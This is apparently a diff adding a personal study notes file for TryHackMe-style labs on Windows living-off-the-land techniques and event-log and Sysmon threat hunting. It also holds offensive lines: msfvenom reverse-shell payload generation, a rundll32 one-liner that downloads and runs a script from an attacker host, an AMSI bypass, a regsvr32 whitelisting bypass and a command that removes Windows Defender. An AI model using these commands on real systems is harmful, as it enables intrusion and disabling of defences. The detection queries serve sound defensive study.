+Executing (Win32_Process)->Create()
+Method execution successful.
+Out Parameters:
+instance of __PARAMETERS
+{
+        ProcessId = 1740;
+        ReturnValue = 0;
+};
+
+rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
+
+explorer.exe /root,"C:\Windows\System32\calc.exe"
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll 
+msfconsole -q 
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST ATTACKBOX_IP; set LPORT 443; exploit"
+
+
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
+--------------------------------------------
+ bypass the Windows application whitelisting.
+
+C:\Users\thm> c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
+or
+C:\Users\thm> c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
+--------------------------------------------
+findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
+-------------------------------------------------------
+\\live.sysinternals.com\tools 
+https://live.sysinternals.com/
+---------------------------
+
+Get-Service | Where-Object -Property Status -eq Stopped | Sort-Object
+Uninstall-WindowsFeature -Name Windows-Defender
+
+The first step when you have gained initial access to any machine would be to enumerate. We'll be enumerating the following:
+
+    users
+
+
+    basic networking information
+    file permissions
+    registry permissions
+    scheduled and running tasks
+    insecure files
+
+
+
+
+powershell -ep bypass
+. .\Downloads\PowerView.ps1
+Get-NetGroup -GroupName *admin*    
+Get-NetUser | select cn    
+Get-NetTCPconnection -State 
+Get hot-fix | measure
+Get-NetIPAddress
+https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+
+Get-WmiObject Win32_Process | 
+  Select-Object Name, ProcessId, @{Name='Owner';Expression={$_.GetOwner().User}} | 
+  Format-Table -AutoSize
+
+    Process Injection (T1055)
+    Process Hollowing (T1055.012)
+    Process Masquerading (T1055.013)
+wevtutil qe System /q:"*[System[(EventID=4624)]]" /f:text     //An account was successfully logged on.
+
+=== ATTACKERS limit visibility========
+
+
+----------------
+History powershell
+$historyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+Test-Path $historyPath
+
+Get-Content $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+----------------------
+STOP script block logging usong gpo-bypass.ps1 
+clear the previous logs if there is no forward logging using
+https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor
+--------------
+ What event ID is to detect a PowerShell downgrade attack? 
+400
+wevtutil qe "Windows PowerShell" /q:"*[System[(EventID=400)]]" /f:text 
+
+Since this attack is such low-hanging fruit and simple in technique, there are a plethora of ways for the blue team to detect and mitigate this attack.
+
+The two easiest mitigations are removing the PowerShell 2.0 engine from the device and denying access to PowerShell 2.0 via application blocklisting.
+
+full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
+---------------------------------------------
+bypass the AMSI utility.
+------------------
+ What event ID logs when the log file was cleared? 
+104
+--------------------------
+https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/580595db9f745688bc7477f6/1476761074992/Windows+Logging+Cheat+Sheet_ver_Oct_2016.pdf
+
+Get-WinEvent -ListLog *
+
+WEvtUtil: Use this utility to query your logs
+a. WevtUtil qe Security – query the Security Log for events
+    i. Lots of flags here so read help “WevtUtil -?”
+    ii. /c:5 = Read 5 events
+    iii. /rd:true = newest events first
+    iv. /f:text = format text, also can do XML
+
+b. Success & Failed Logons - WevtUtil qe Security /q:"*[System[(EventID=4624 or EventID=4625)]]" /c:5 /rd:true /f:text >Parsed\%computername%_Logon_Events_Win7.log
+
+c. User Account Change - WevtUtil qe Security /q:"*[System[(EventID=4738)]]" /c:5 /rd:true /f:text >Parsed\%computername%_User_Account_Change_Win7.log
+
+d. New Service Installed - WevtUtil qe Security /q:"*[System[(EventID=7045)]]" /c:5 /rd:true /f:text >Parsed\%computername%_New_Service_Installed_Win7.log
+
+e. User Account Changes - wevtutil qe Security /q:"*[System[(EventID=4725 or EventID=4722 or EventID=4723 or EventID=4724 or EventID=4726 or EventID=4767)]]" /c:10 /f:text
+
+Spotting the Adversary with Windows Event Log Monitoring. 
+
+https://web.archive.org/web/20190115215749/https://apps.nsa.gov/iaarchive/customcf/openAttachment.cfm?FilePath=/iad/library/ia-guidance/security-configuration/applications/assets/public/upload/Spotting-the-Adversary-with-Windows-Event-Log-Monitoring.pdf&WpKes=aF6woL7fQp3dJiqyJL2LenrLxuHC7ztGtVNK3x
+
+Description	ID	Level	Event Log	Event Source
+Firewall Rule Add	2004	Informational	Microsoft-Windows-Windows Firewall With Advanced Security	Microsoft-Windows-Windows Firewall With Advanced Security
+Firewall Rule Change	2005	Informational	Microsoft-Windows-Windows Firewall With Advanced Security	Microsoft-Windows-Windows Firewall With Advanced Security
+Firewall Rules Deleted	2006, 2033	Informational	Microsoft-Windows-Windows Firewall With Advanced Security	Microsoft-Windows-Windows Firewall With Advanced Security
+Firewall Failed to load Group Policy	2009	Error	Microsoft-Windows-Windows Firewall With Advanced Security	Microsoft-Windows-Windows Firewall With Advanced Security
+
+Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-Windows Firewall With Advanced Security";Id=2004} | measure | % count
+
+Get-WinEvent -ListProvider * | Where-Object { $_.Name -match "firewall" }
+
+------------------------------------------------------------------------------------------------------------------------
+ATT&CK ID T1098 (Account Manipulation)
+
+Collect events that correlate with changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728, and 4670. Especially flag events where the subject and target accounts differ[1] or that include additional flags such as changing a password with unusual systems. Especially flag events where the subject and target accounts differ[1] or that include additional flags such as changing a password with unusual systems.
+
+Get-WinEvent -FilterHashtable @{
+    ProviderName="Microsoft-Windows-Security-Auditing"
+    Id=4670,4728,4738
+}
+
+
+------------------------------------------
+Audit Process Creation
+
+Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-Security-Auditing";Id=4688} -MaxEvents 10 | Format-List -Property *|findstr /i "process command line"
+Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4688 }
+----------------------------------------------
+
+a. WevtUtil qe Security – query the Security Log for events
+   i. Lots of flags here so read help “WevtUtil -?”
+   ii. /c:5 = Read 5 events
+   iii. /rd:true = newest events first
+   iv. /f:text = format text, also can do XML
+
+b. Firewall Rule Added - WevtUtil qe Security /q:"*[System[(EventID=2004)]]" /c:5 /rd:true /f:text >Parsed\%computername%_Firewall_Rule_Added.log
+
+c. Firewall Rule Changed - WevtUtil qe Security /q:"*[System[(EventID=2005)]]" /c:5 /rd:true /f:text >Parsed\%computername%_Firewall_Rule_Changed.log
+
+d. Firewall Rules Deleted - WevtUtil qe Security /q:"*[System[(EventID=2006 or EventID=2033)]]" /c:5 /rd:true /f:text >Parsed\%computername%_Firewall_Rules_Deleted.log
+
+e. Firewall Failed to Load Group Policy - wevtutil qe Security /q:"*[System[(EventID=2009)]]" /c:5 /rd:true /f:text >Parsed\%computername%_Firewall_Failed_GP.log
+----------------------------------------------------------------------------------------------------------------------------------------------------
+This event indicates that the system detected an executable file with invalid page hashes. This could be a sign of file corruption or potentially malicious tampering.
+
+Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 6281 }
+----------------------------------------------------------------------------------------------------
+When a user account is created in Active Directory, event ID 4720 is logged.
+Get-WinEvent -LogName Security -FilterXPath '*/System/EventID=4720'
+
+Event ID 4724 is generated every time an account attempts to reset the password for another account
+Get-WinEvent -LogName Security -FilterXPath '*/System/EventID=4724' -MaxEvents 1 | Format-List -Property *
+--------
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+
+----------------------------------
+[SYSMON] - cutting down on noise. 
+Applications and Services Logs/Microsoft/Windows/Sysmon/Operational
+
+Event ID 1: Process Creation
+
+++++++++++++++++++++++++++++++++++++++++
+Event ID 3: Network Connection:
+
+look for network connections coming from port 4444.
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"  -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=4444'
+
+Hunting Metasploit 
+
+Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_Metasploit.evtx -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=4444'
+
+Hunting Rats and C2 Servers Common Back Connect Ports with PowerShell:
+
+ Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_Rats.evtx -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=8080'
+
+ports to check: https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo/edit#gid=0
+
+++++++++++++++++++++++++++++++++++++++++
+
+Event ID 7: Image Loaded
+++++++++++++++++++++++++++++++++++++++++
+
+Event ID 8: CreateRemoteThread
+
+Detecting Evasion Techniques
+This is used in multiple evasion techniques including DLL Injection, Thread Hijacking, and Process Hollowing. 
+
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath '*/System/EventID=8'
+
+
+Detecting Evasion Techniques with PowerShell
+
+++++++++++++++++++++++++++++++++++++++++
+
+Event ID 10: CreateRemoteThread
+
+MITRE ATTACK T1055 and S0002.
+
+Detecting Mimikatz Abnormal LSASS Behavior MITRE ATTACK T1055 and S0002.
+
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"  -FilterXPath '*/System/EventID=10 and */EventData/Data[@Name="TargetImage"] and */EventData/Data="C:\Windows\system32\lsass.exe"'
+
+++++++++++++++++++++++++++++++++++++++++
+
+Event ID 11: File Created
+
+Hunting Startup Persistence
+
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"  -FilterXPath '*/EventData/Data[@Name="RuleName"] and */EventData/Data="T1023"'
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"  -FilterXPath '*/EventData/Data[@Name="RuleName"] and */EventData/Data="T1165"'
+
+ MITRE ATT&CK T1112.
+Get-WinEvent -Path "C:\Users\THM-Analyst\Desktop\Scenarios\Practice\T1060.evtx"  -FilterXPath '*/EventData/Data[@Name="RuleName"] and */EventData/Data="T1060,Runkey"'
+Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\T1060.evtx | 
+    Where-Object { $_.Message -match "RuleName:\s*T1060" }
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | 
+    Where-Object { $_.Message -match "RuleName:\s*T\s*" }
+
+
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"  -FilterXPath '*/EventData/Data[@Name="RuleName"] and */EventData/Data="T1484"'
+Get-WinEvent -Path "C:\Users\THM-Analyst\Desktop\Scenarios\Practice\T1023.evtx"  -FilterXPath '*/EventData/Data[@Name="RuleName"] and */EventData/Data="T1023"'
+
+++++++++++++++++++++++++++++++++++++++++
+
+Event ID 12 / 13 / 14: Registry Event
+Event ID 15: FileCreateStreamHash
+Event ID 22: DNS Event
+
++++++++++++++++++++=====
+THE THREE COMMANDS I USED IN INVESTIGATION:
+Sysmon.exe -accepteula -i ..\Configuration\swift.xml
+
+Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-2.evtx
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" 
+
+ Get-WinEvent  -LogName "Microsoft-Windows-Sysmon/Operational"   | Where-Object { $_.Message -match "\s*process create\s*" }
+
+ Get-WinEvent  -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-2.evtx  | Where-Object { $_.Message -match "\s*Network\s*" }  | Format-List -Property *
+
+---------------------------------------------
+
+wscript c:\Users\thm\Desktop\payload.vbs
+ cscript.exe c:\Users\thm\Desktop\payload.vbs
+
+Another trick. If the VBS files are blacklisted, then we can rename the file to .txt file and run it using wscript as follows,
+
+
+wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
+ 
+=============[CHAT HEADS]======
+Insecure Permissions Security Risk
+Insecure Permissions Security Risk
+AD Computer Naming and Policies
+Extracting C Code from Image
+
+===========[ CYBER NERD ] =========
+https://unprotect.it/
+interesting go by: https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5 
+
+latest mimikatz update: https://github.com/gentilkiwi/mimikatz/releases 
+
+got it from: https://twitter.com/gentilkiwi/status/851193274836692994 
+
+about rdp and bmp https://www.allthingsdfir.com/do-you-even-bitmap-cache-bro/ 
+=============== [ COURSES ] ========
+Mastering Red Team:The Complete Cyber Security Course (2023) by Nikhil Srivastava
+Beginning C++ Programming - From Beginner to Beyond by Dr. Frank Mitropoulos
+Mastering Data Structures & Algorithms using C and C++ by Abdul Bari
+The Complete SSL and TLS Guide: HTTP to HTTPS by Bogdan Stashchuk
+The Complete Networking Fundamentals Course. Your CCNA start by David Bombal
+Cisco BGP Masterclass for Enterprise Network Engineers by Neil Anderson
+SSL/TLS essentials: theory and implementation by Ahmed Elfakharany
+Docker Mastery: with Kubernetes +Swarm from a Docker Captain by Bret Fisher
+Windows Privilege Escalation for Beginners (2020) [En] by Heath Adams
+Pluralsight - Red Team Tools 
+Pluralsight - Blue Team Tools
+x86_64 Assembly Language and Shellcoding on Linux by Pentesters Academy
+Security Manage Network Security With pfSense Firewall by Manuj Aggarwal
+Ethical Hacking/Complete RED TEAM OPERATIONS in Practical by Ajay Ravichandran
+
+
+
+
+=================[NOT SO SECURE ] ==============================
+
+-------[Linux Enumeration]-----------
+https://pentestmonkey.net/tools/audit/unix-privesc-check
+https://github.com/rebootuser/LinEnum
+
+-------[privesc]-----------
+
+Linux Kernel 2.6.37 rootkit
+https://www.exploit-db.com/exploits/15704
